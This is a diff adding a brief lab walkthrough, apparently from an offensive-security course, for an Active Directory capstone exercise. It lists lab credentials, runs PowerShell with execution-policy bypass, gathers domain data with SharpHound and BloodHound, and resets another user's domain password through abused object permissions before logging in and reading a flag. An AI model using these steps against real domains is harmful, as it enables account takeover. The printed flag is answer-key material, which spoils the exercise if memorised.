@@ -1,0 +1,31 @@
+Topics: Analysing Data Using Bloodhound
+Questions 3
+Capstone Exercise: Start VM Group 2 and log in as stephanie to CLIENT75. From CLIENT75, enumerate the object permissions for the domain users. Once weak permissions have been identified, use them to take full control over the account and use it to log in to the domain. Once logged in, repeat the enumeration process using techniques shown in this Module to obtain the flag.
+
+HINT
+Bloodhound data might show Stephanie has a first-degree object control.
+Powerview could also be used to find any exciting domain Acl Stephanie has.
+Does the new user have local admin access?
+
+xfreerdp /u:stephanie /d:corp.com /v:192.168.173.75 
+Password: LegmanTeamBenzoin!!
+
+# Lets Import SharpHound
+# Open powershell
+powershell -ep bypass
+cd C:\Tools
+PS C:\Tools> Import-Module .\Sharphound.ps1
+PS C:\Tools> Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit"
+
+sudo neo4j start
+kali@kali:~$ bloodhound
+[Credentials]
+neo4j:kali
+
+# Found out stephanie had full control of the robert user, and we can change the password of it 
+net user robert Password123! /domain
+
+xfreerdp /u:robert /d:corp.com /v:192.168.173.74
+password: Password123!
+PS C:\Users\administrator\Desktop> cat proof.txt
+OS{2b263abea24ffa7b6fa6b5dd00bd6c1f}
